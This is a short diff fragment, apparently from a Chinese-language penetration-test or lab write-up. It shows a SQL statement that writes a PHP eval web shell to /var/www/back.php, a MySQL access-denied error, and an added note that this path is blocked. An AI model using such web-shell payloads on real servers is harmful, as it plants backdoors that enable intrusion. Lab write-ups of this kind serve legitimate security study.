@@ -510,4 +510,5 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 ```go
 \#1045 - Access denied for user 'billu'@'localhost' (using password: YES)
 ```
+没有权限，此路不通
 
